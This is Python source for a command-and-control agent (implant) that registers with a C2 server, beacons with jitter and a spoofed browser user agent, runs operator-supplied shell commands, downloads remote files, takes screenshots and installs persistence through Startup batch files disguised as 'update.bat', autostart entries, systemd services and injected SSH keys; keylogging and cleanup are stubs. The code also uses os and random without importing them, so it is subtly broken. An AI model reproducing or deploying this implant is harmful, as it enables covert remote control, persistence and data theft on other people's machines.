"""
C2 Client (Agent)

Agent implementation that connects to the C2 server.
"""

import asyncio
import json
import uuid
import base64
import hashlib
import logging
import platform
import socket
import subprocess
from typing import Dict, List, Any, Optional, Callable, Awaitable
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta

import aiohttp


@dataclass
class C2Config:
    """Configuration for the C2 client"""
    server_url: str
    auth_token: str
    agent_id: Optional[str] = None
    checkin_interval: int = 60
    reconnect_delay: int = 10
    max_retries: int = 3
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    jitter: float = 0.1  # 10% jitter
    
    # Proxy configuration
    proxy_url: Optional[str] = None
    proxy_auth: Optional[str] = None
    
    # Kill date
    kill_date: Optional[datetime] = None
    
    # Working hours
    work_start: Optional[str] = None  # "09:00"
    work_end: Optional[str] = None    # "17:00"


@dataclass
class CommandResult:
    """Result of a command execution"""
    command_id: str
    output: str
    exit_code: int
    error: Optional[str] = None
    execution_time: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'command_id': self.command_id,
            'output': self.output,
            'exit_code': self.exit_code,
            'error': self.error,
            'execution_time': self.execution_time
        }


class C2Client:
    """
    C2 client (agent) that connects to the C2 server.
    
    Features:
    - HTTP/HTTPS communication
    - WebSocket support
    - Command execution
    - File transfer
    - Persistence
    - Stealth techniques
    - Kill switch
    - Working hours
    
    Usage:
    >>> config = C2Config(
    ...     server_url="http://c2-server:8080",
    ...     auth_token="secret-token"
    ... )
    >>> client = C2Client(config)
    >>> asyncio.run(client.run())
    """
    
    def __init__(self, config: C2Config):
        """
        Initialize the C2 client.
        
        Args:
            config: C2 configuration
        """
        self.config = config
        self.agent_id = config.agent_id or str(uuid.uuid4())
        self.session: Optional[aiohttp.ClientSession] = None
        self.ws: Optional[aiohttp.ClientWebSocketResponse] = None
        self.running = False
        self.logger = self._configure_logging()
        
        # Agent information
        self.agent_info = self._get_agent_info()
        
        # Command handlers
        self.command_handlers: Dict[str, Callable[[Dict[str, Any]], Awaitable[CommandResult]]] = {
            'exec': self._handle_exec_command,
            'shell': self._handle_shell_command,
            'download': self._handle_download_command,
            'upload': self._handle_upload_command,
            'screenshot': self._handle_screenshot_command,
            'keylogger_start': self._handle_keylogger_start,
            'keylogger_stop': self._handle_keylogger_stop,
            'persist': self._handle_persist_command,
            'self_destruct': self._handle_self_destruct_command,
            'info': self._handle_info_command,
        }
        
        # State
        self.keylogger_active = False
        self.keylogger_process = None
    
    def _configure_logging(self) -> logging.Logger:
        """Configure logging"""
        logger = logging.getLogger(f'C2Client-{self.agent_id}')
        logger.setLevel(logging.INFO)
        
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter(
            '[%(asctime)s] [Agent %s] %(levelname)s: %(message)s' % self.agent_id
        ))
        logger.addHandler(handler)
        
        return logger
    
    def _get_agent_info(self) -> Dict[str, Any]:
        """Get agent information"""
        return {
            'agent_id': self.agent_id,
            'hostname': socket.gethostname(),
            'ip_address': self._get_local_ip(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'user': self._get_current_user(),
            'privileges': self._get_privileges()
        }
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Try to get external IP first
            import requests
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json()['ip']
        except:
            # Fall back to local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(('8.8.8.8', 80))
                ip = s.getsockname()[0]
            except:
                ip = '127.0.0.1'
            finally:
                s.close()
            return ip
    
    def _get_current_user(self) -> str:
        """Get current user"""
        try:
            import getpass
            return getpass.getuser()
        except:
            return 'unknown'
    
    def _get_privileges(self) -> str:
        """Get current privileges"""
        try:
            if platform.system() == 'Windows':
                import ctypes
                # Check if running as admin
                try:
                    return 'admin' if ctypes.windll.shell32.IsUserAnAdmin() else 'user'
                except:
                    return 'user'
            else:
                # Check if root
                return 'root' if os.geteuid() == 0 else 'user'
        except:
            return 'user'
    
    async def run(self):
        """Run the C2 client"""
        self.running = True
        self.logger.info(f"Starting C2 client. Server: {self.config.server_url}")
        
        try:
            # Register with server
            await self._register()
            
            # Main loop
            while self.running:
                try:
                    # Check kill date
                    if self._check_kill_date():
                        self.logger.info("Kill date reached. Shutting down.")
                        await self._self_destruct()
                        break
                    
                    # Check working hours
                    if not self._check_working_hours():
                        self.logger.info("Outside working hours. Sleeping.")
                        await asyncio.sleep(300)  # 5 minutes
                        continue
                    
                    # Checkin with server
                    commands = await self._checkin()
                    
                    # Execute commands
                    for command in commands:
                        await self._execute_command(command)
                    
                    # Calculate sleep time with jitter
                    sleep_time = self._calculate_sleep_time()
                    self.logger.info(f"Sleeping for {sleep_time:.1f} seconds")
                    await asyncio.sleep(sleep_time)
                    
                except Exception as e:
                    self.logger.error(f"Error in main loop: {e}")
                    await asyncio.sleep(self.config.reconnect_delay)
        
        finally:
            self.running = False
            await self._cleanup()
            self.logger.info("C2 client stopped")
    
    async def _register(self):
        """Register with the C2 server"""
        self.logger.info("Registering with C2 server")
        
        url = f"{self.config.server_url}/api/agents/register"
        
        payload = {
            'hostname': self.agent_info['hostname'],
            'ip_address': self.agent_info['ip_address'],
            'os': self.agent_info['os'],
            'architecture': self.agent_info['architecture'],
            'user': self.agent_info['user'],
            'privileges': self.agent_info['privileges']
        }
        
        headers = {
            'X-Auth-Token': self.config.auth_token,
            'User-Agent': self.config.user_agent
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    self.agent_id = data.get('agent_id', self.agent_id)
                    self.logger.info(f"Registration successful. Agent ID: {self.agent_id}")
                else:
                    self.logger.error(f"Registration failed: {response.status}")
                    raise Exception(f"Registration failed: {response.status}")
    
    async def _checkin(self) -> List[Dict[str, Any]]:
        """Checkin with the C2 server and get commands"""
        self.logger.info("Checking in with C2 server")
        
        url = f"{self.config.server_url}/api/agents/checkin"
        
        payload = {
            'agent_id': self.agent_id
        }
        
        headers = {
            'X-Auth-Token': self.config.auth_token,
            'User-Agent': self.config.user_agent
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    commands = data.get('commands', [])
                    self.logger.info(f"Received {len(commands)} commands")
                    return commands
                else:
                    self.logger.error(f"Checkin failed: {response.status}")
                    return []
    
    async def _execute_command(self, command: Dict[str, Any]):
        """Execute a command"""
        command_id = command.get('command_id')
        command_type = command.get('command')
        args = command.get('args', [])
        
        self.logger.info(f"Executing command: {command_type} (ID: {command_id})")
        
        try:
            # Get handler
            handler = self.command_handlers.get(command_type)
            if not handler:
                self.logger.error(f"Unknown command type: {command_type}")
                await self._send_response(command_id, "", 1, f"Unknown command: {command_type}")
                return
            
            # Execute handler
            result = await handler({'args': args})
            
            # Send response
            await self._send_response(
                command_id,
                result.output,
                result.exit_code,
                result.error
            )
            
        except Exception as e:
            self.logger.error(f"Command execution error: {e}")
            await self._send_response(command_id, "", 1, str(e))
    
    async def _send_response(
        self,
        command_id: str,
        output: str,
        exit_code: int,
        error: Optional[str] = None
    ):
        """Send command response to server"""
        url = f"{self.config.server_url}/api/agents/{self.agent_id}/responses"
        
        payload = {
            'command_id': command_id,
            'output': output,
            'exit_code': exit_code,
            'error': error
        }
        
        headers = {
            'X-Auth-Token': self.config.auth_token,
            'User-Agent': self.config.user_agent
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as response:
                if response.status != 200:
                    self.logger.error(f"Failed to send response: {response.status}")
    
    async def _handle_exec_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle exec command"""
        import time
        
        args = command.get('args', [])
        if not args:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error='No command specified'
            )
        
        cmd = ' '.join(args)
        
        start_time = time.time()
        try:
            # Execute command
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(timeout=30)
            
            exit_code = process.returncode
            output = stdout or stderr or ''
            
            execution_time = time.time() - start_time
            
            return CommandResult(
                command_id=command.get('command_id', ''),
                output=output,
                exit_code=exit_code,
                execution_time=execution_time
            )
            
        except subprocess.TimeoutExpired:
            process.kill()
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error='Command timed out',
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e),
                execution_time=time.time() - start_time
            )
    
    async def _handle_shell_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle interactive shell command"""
        # For now, just execute the command
        return await self._handle_exec_command(command)
    
    async def _handle_download_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle file download command"""
        args = command.get('args', [])
        
        if len(args) < 2:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error='Usage: download <url> <destination>'
            )
        
        url = args[0]
        destination = args[1]
        
        try:
            import requests
            response = requests.get(url, timeout=30)
            
            with open(destination, 'wb') as f:
                f.write(response.content)
            
            return CommandResult(
                command_id=command.get('command_id', ''),
                output=f'Downloaded {len(response.content)} bytes to {destination}',
                exit_code=0
            )
            
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_upload_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle file upload command"""
        args = command.get('args', [])
        
        if len(args) < 1:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error='Usage: upload <source>'
            )
        
        source = args[0]
        
        try:
            # In a real implementation, this would upload to the C2 server
            # For now, just read the file
            with open(source, 'rb') as f:
                content = f.read()
            
            # Simulate upload
            return CommandResult(
                command_id=command.get('command_id', ''),
                output=f'Ready to upload {len(content)} bytes from {source}',
                exit_code=0
            )
            
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_screenshot_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle screenshot command"""
        try:
            if platform.system() == 'Windows':
                # Windows screenshot
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot.save('/tmp/screenshot.png')
                return CommandResult(
                    command_id=command.get('command_id', ''),
                    output='Screenshot saved to /tmp/screenshot.png',
                    exit_code=0
                )
            else:
                # Linux/macOS screenshot
                subprocess.run(['import', '-window', 'root', '/tmp/screenshot.png'], check=True)
                return CommandResult(
                    command_id=command.get('command_id', ''),
                    output='Screenshot saved to /tmp/screenshot.png',
                    exit_code=0
                )
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_keylogger_start(self, command: Dict[str, Any]) -> CommandResult:
        """Handle keylogger start command"""
        if self.keylogger_active:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='Keylogger already running',
                exit_code=0
            )
        
        try:
            # In a real implementation, this would start a keylogger
            # For demo, we'll just set the flag
            self.keylogger_active = True
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='Keylogger started',
                exit_code=0
            )
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_keylogger_stop(self, command: Dict[str, Any]) -> CommandResult:
        """Handle keylogger stop command"""
        if not self.keylogger_active:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='Keylogger not running',
                exit_code=0
            )
        
        try:
            # In a real implementation, this would stop the keylogger
            self.keylogger_active = False
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='Keylogger stopped',
                exit_code=0
            )
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_persist_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle persistence command"""
        args = command.get('args', [])
        
        if not args:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error='Usage: persist <method> [args...]'
            )
        
        method = args[0]
        
        try:
            if method == 'cron':
                return await self._persist_cron(args[1:])
            elif method == 'startup':
                return await self._persist_startup(args[1:])
            elif method == 'service':
                return await self._persist_service(args[1:])
            elif method == 'ssh':
                return await self._persist_ssh(args[1:])
            else:
                return CommandResult(
                    command_id=command.get('command_id', ''),
                    output='',
                    exit_code=1,
                    error=f'Unknown persistence method: {method}'
                )
        except Exception as e:
            return CommandResult(
                command_id=command.get('command_id', ''),
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _persist_cron(self, args: List[str]) -> CommandResult:
        """Establish persistence via cron"""
        if not args:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error='Usage: persist cron <command> [schedule]'
            )
        
        command = args[0]
        schedule = args[1] if len(args) > 1 else '*/5 * * * *'
        
        try:
            # Add to crontab
            cron_entry = f"{schedule} {command}\n"
            
            # In a real implementation, this would add to crontab
            # For demo, we'll just log it
            self.logger.info(f"Adding cron entry: {cron_entry.strip()}")
            
            return CommandResult(
                command_id='',
                output=f'Added cron entry: {cron_entry.strip()}',
                exit_code=0
            )
        except Exception as e:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _persist_startup(self, args: List[str]) -> CommandResult:
        """Establish persistence via startup scripts"""
        if not args:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error='Usage: persist startup <command>'
            )
        
        command = args[0]
        
        try:
            if platform.system() == 'Windows':
                # Windows startup
                startup_dir = os.path.join(
                    os.environ.get('APPDATA', ''),
                    'Microsoft',
                    'Windows',
                    'Start Menu',
                    'Programs',
                    'Startup'
                )
                os.makedirs(startup_dir, exist_ok=True)
                
                script_path = os.path.join(startup_dir, 'update.bat')
                with open(script_path, 'w') as f:
                    f.write(f'@echo off\n{command}\n')
                
                return CommandResult(
                    command_id='',
                    output=f'Added startup script: {script_path}',
                    exit_code=0
                )
            else:
                # Linux/macOS startup
                startup_file = os.path.expanduser('~/.config/autostart/update.desktop')
                os.makedirs(os.path.dirname(startup_file), exist_ok=True)
                
                with open(startup_file, 'w') as f:
                    f.write(f'''[Desktop Entry]\nType=Application\nName=Update\nExec={command}\n''')
                
                return CommandResult(
                    command_id='',
                    output=f'Added startup entry: {startup_file}',
                    exit_code=0
                )
        except Exception as e:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _persist_service(self, args: List[str]) -> CommandResult:
        """Establish persistence via systemd service"""
        if not args:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error='Usage: persist service <name> <command>'
            )
        
        name = args[0]
        command = args[1] if len(args) > 1 else '/bin/true'
        
        try:
            if platform.system() != 'Windows':
                # Create service file
                service_file = f'/etc/systemd/system/{name}.service'
                
                with open(service_file, 'w') as f:
                    f.write(f'''[Unit]\nDescription={name}\nAfter=network.target\n\n[Service]\nExecStart={command}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n''')
                
                # Enable and start service
                subprocess.run(['systemctl', 'daemon-reload'], check=True)
                subprocess.run(['systemctl', 'enable', name], check=True)
                subprocess.run(['systemctl', 'start', name], check=True)
                
                return CommandResult(
                    command_id='',
                    output=f'Created and started service: {name}',
                    exit_code=0
                )
            else:
                return CommandResult(
                    command_id='',
                    output='',
                    exit_code=1,
                    error='Service persistence not supported on Windows'
                )
        except Exception as e:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _persist_ssh(self, args: List[str]) -> CommandResult:
        """Establish persistence via SSH keys"""
        if not args:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error='Usage: persist ssh <public_key>'
            )
        
        public_key = args[0]
        
        try:
            ssh_dir = os.path.expanduser('~/.ssh')
            os.makedirs(ssh_dir, exist_ok=True)
            
            authorized_keys = os.path.join(ssh_dir, 'authorized_keys')
            with open(authorized_keys, 'a') as f:
                f.write(f'{public_key}\n')
            
            os.chmod(authorized_keys, 0o600)
            
            return CommandResult(
                command_id='',
                output=f'Added SSH key to {authorized_keys}',
                exit_code=0
            )
        except Exception as e:
            return CommandResult(
                command_id='',
                output='',
                exit_code=1,
                error=str(e)
            )
    
    async def _handle_self_destruct_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle self-destruct command"""
        await self._self_destruct()
        return CommandResult(
            command_id=command.get('command_id', ''),
            output='Self-destruct initiated',
            exit_code=0
        )
    
    async def _handle_info_command(self, command: Dict[str, Any]) -> CommandResult:
        """Handle info command"""
        info = self._get_agent_info()
        return CommandResult(
            command_id=command.get('command_id', ''),
            output=json.dumps(info, indent=2),
            exit_code=0
        )
    
    async def _self_destruct(self):
        """Self-destruct the agent"""
        self.logger.info("Initiating self-destruct sequence")
        
        try:
            # Remove all files
            self._remove_agent_files()
            
            # Remove persistence
            await self._remove_persistence()
            
            # Remove from crontab
            self._remove_from_crontab()
            
            # Exit
            self.running = False
            
        except Exception as e:
            self.logger.error(f"Self-destruct error: {e}")
    
    def _remove_agent_files(self):
        """Remove all agent files"""
        self.logger.info("Removing agent files")
        
        # In a real implementation, this would remove all files created by the agent
        # For demo, we'll just log it
        pass
    
    async def _remove_persistence(self):
        """Remove all persistence mechanisms"""
        self.logger.info("Removing persistence mechanisms")
        
        # In a real implementation, this would remove all persistence mechanisms
        # For demo, we'll just log it
        pass
    
    def _remove_from_crontab(self):
        """Remove from crontab"""
        self.logger.info("Removing from crontab")
        
        # In a real implementation, this would remove all cron entries
        # For demo, we'll just log it
        pass
    
    async def _cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        
        if self.ws:
            await self.ws.close()
    
    def _check_kill_date(self) -> bool:
        """Check if kill date has been reached"""
        if not self.config.kill_date:
            return False
        
        return datetime.now(timezone.utc) >= self.config.kill_date
    
    def _check_working_hours(self) -> bool:
        """Check if current time is within working hours"""
        if not self.config.work_start or not self.config.work_end:
            return True
        
        now = datetime.now()
        current_hour = now.hour
        current_minute = now.minute
        
        # Parse work start and end
        start_hour, start_minute = map(int, self.config.work_start.split(':'))
        end_hour, end_minute = map(int, self.config.work_end.split(':'))
        
        # Convert to minutes since midnight
        current_total = current_hour * 60 + current_minute
        start_total = start_hour * 60 + start_minute
        end_total = end_hour * 60 + end_minute
        
        # Check if within working hours
        if start_total <= end_total:
            # Normal case (e.g., 9:00-17:00)
            return start_total <= current_total <= end_total
        else:
            # Overnight case (e.g., 22:00-6:00)
            return current_total >= start_total or current_total <= end_total
    
    def _calculate_sleep_time(self) -> float:
        """Calculate sleep time with jitter"""
        base_time = self.config.checkin_interval
        jitter_range = base_time * self.config.jitter
        jitter = random.uniform(-jitter_range, jitter_range)
        
        sleep_time = base_time + jitter
        return max(1, sleep_time)  # Minimum 1 second
